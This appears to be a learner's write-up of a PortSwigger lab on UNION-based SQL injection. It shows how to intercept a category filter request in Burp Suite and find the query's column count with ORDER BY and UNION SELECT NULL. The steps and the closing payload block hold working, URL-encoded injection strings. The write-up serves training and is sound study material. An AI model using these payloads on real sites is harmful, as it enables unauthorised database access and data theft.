# 📝 Lab: SQL injection UNION attack, determining the number of columns returned by the query

- **Vulnerability:** SQL Injection.
- **Difficulty:** PRACTITIONER.
- **Objective:** Determine the exact number of columns returned by the original query.

---

## 🛠️ Tools Used
- Browser (FoxyProxy)
- Burp Suite

---

## 🐾 Steps to Reproduce
1. Open the lab's main page, turn on the *FoxyProxy* extension, and click on any category (e.g., Gifts).
2. Open **Burp Suite -> Proxy -> HTTP History**, find the request, and press `Ctrl+R` to send it to **Repeater**.
3. In Repeater, look at the request: `GET /filter?category=Gifts HTTP/2`. The `category` parameter is our vulnerable injection point.
4. First, we can try to find the column count using the `ORDER BY` method. If you inject `GET /filter?category=Gifts'+ORDER+BY+1--` and get a **500 Internal Server Error**, try changing the `+` (space) into `%20` encoding like this: `'%20ORDER%20BY%201--`. 
   *(Honestly, you can just skip the `ORDER BY` part entirely if you want to jump straight to the `UNION` method! 😂)*
5. Let's use the `UNION SELECT NULL` approach. The trick is to inject `NULL` values and keep adding them one by one until the server stops throwing errors and returns a normal **200 OK**. 
   We test 1 column (`NULL`), then 2 columns (`NULL,NULL`), and finally hit the jackpot with 3 columns:
   `GET /filter?category=Gifts'%20UNION%20SELECT%20NULL,NULL,NULL--`
6. Boom! The server responds with `200 OK`, and the **Lab Solved** banner will appear.

<img width="1917" height="911" alt="Screenshot 2026-09-16 233039" src="https://github.com/user-attachments/assets/47bedada-62db-4266-8bf8-dc43864822b1" />

---

## 🎯 Impact
Determining the exact number of columns is the critical first step in performing a successful UNION-based SQL injection. Once an attacker successfully maps out the column count, they can easily proceed to dump sensitive data from other tables in the database, leading to massive data breaches and system compromise.

---

## 💣 Payload
```sql
-- Alternative 1: Testing with ORDER BY (using %20 for spaces)
'%20ORDER%20BY%201--
'%20ORDER%20BY%202--
'%20ORDER%20BY%203--

-- Alternative 2: Testing with UNION SELECT NULL
'%20UNION%20SELECT%20NULL--
'%20UNION%20SELECT%20NULL,NULL--
'%20UNION%20SELECT%20NULL,NULL,NULL--
```
## 🔗 Reference:
For more powerful payloads, check out the [PortSwigger SQLi Cheat Sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)
